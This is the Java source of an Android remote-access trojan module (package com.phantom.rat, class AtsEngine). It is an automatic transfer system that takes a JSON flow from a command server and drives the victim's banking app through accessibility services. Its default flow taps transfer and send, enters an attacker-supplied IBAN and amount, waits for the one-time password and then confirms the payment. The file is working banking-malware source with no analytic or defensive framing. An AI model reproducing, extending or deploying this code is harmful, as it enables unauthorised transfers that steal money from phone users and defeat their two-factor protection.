package com.phantom.rat;

import android.content.Context;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public final class AtsEngine {
    private AtsEngine() {}

    public static class Op {
        public final String type;   // TAP_TEXT | SET_HINT_TEXT | WAIT_PACKAGE | WAIT_OTP | WAIT_MS | DONE
        public final String value;
        public final String text;
        public Op(String type, String value, String text) {
            this.type = type; this.value = value; this.text = text;
        }
    }

    public static class Script {
        private final List<Op> ops = new ArrayList<>();
        private int idx = 0;
        public void add(Op op) { ops.add(op); }
        public Op current() { return idx < ops.size() ? ops.get(idx) : null; }
        public void next() { idx++; }
        public boolean finished() { return idx >= ops.size(); }
    }

    /** Command entry — parse JSON flow from server, arm AccessibilityModule to drive it. */
    public static String execute(Context ctx, String args) {
        try {
            JSONObject o = new JSONObject(args == null || args.isEmpty() ? "{}" : args);
            JSONArray flow = o.optJSONArray("flow");
            if (flow == null || flow.length() == 0) {
                // default transfer flow
                Script s = defaultFlow(ctx, o);
                AccessibilityModule.setAtsScript(s);
                return "ats armed (default flow)";
            }
            Script s = new Script();
            for (int i = 0; i < flow.length(); i++) {
                JSONObject step = flow.getJSONObject(i);
                s.add(new Op(step.optString("type"), step.optString("value"),
                        step.optString("text")));
            }
            s.add(new Op("DONE", "", ""));
            AccessibilityModule.setAtsScript(s);
            return "ats armed (" + flow.length() + " steps)";
        } catch (Exception e) {
            return "ats error: " + e.getMessage();
        }
    }

    private static Script defaultFlow(Context ctx, JSONObject o) {
        Script s = new Script();
        String target = o.optString("target", "");
        String amount = o.optString("amount", "");
        String currency = o.optString("currency", "USD");
        String app = o.optString("app", "");
        if (!app.isEmpty()) s.add(new Op("WAIT_PACKAGE", app, ""));
        s.add(new Op("TAP_TEXT", "transfer", ""));
        s.add(new Op("TAP_TEXT", "send", ""));
        s.add(new Op("TAP_TEXT", "external", ""));
        s.add(new Op("SET_HINT_TEXT", "iban|account|recipient|address|beneficiary", target));
        s.add(new Op("SET_HINT_TEXT", "amount|value|sum|quantity", amount));
        if (currency != null && !currency.isEmpty() && !"USD".equals(currency)) {
            s.add(new Op("SET_HINT_TEXT", "currency", currency));
        }
        s.add(new Op("TAP_TEXT", "continue", ""));
        s.add(new Op("TAP_TEXT", "next", ""));
        s.add(new Op("WAIT_OTP", "", ""));
        s.add(new Op("TAP_TEXT", "confirm", ""));
        s.add(new Op("TAP_TEXT", "submit", ""));
        s.add(new Op("DONE", "", ""));
        return s;
    }

    /** Called by AccessibilityModule when a node matches a step; validates actions exist. */
    public static boolean hasAction(AccessibilityNodeInfo n, String action) {
        if (n == null || action == null) return false;
        List<AccessibilityNodeInfo> nodes = n.findAccessibilityNodeInfosByText(action);
        for (AccessibilityNodeInfo node : nodes) {
            if (node.isClickable()) return true;
            AccessibilityNodeInfo p = node.getParent();
            if (p != null && p.isClickable()) return true;
        }
        return false;
    }
}
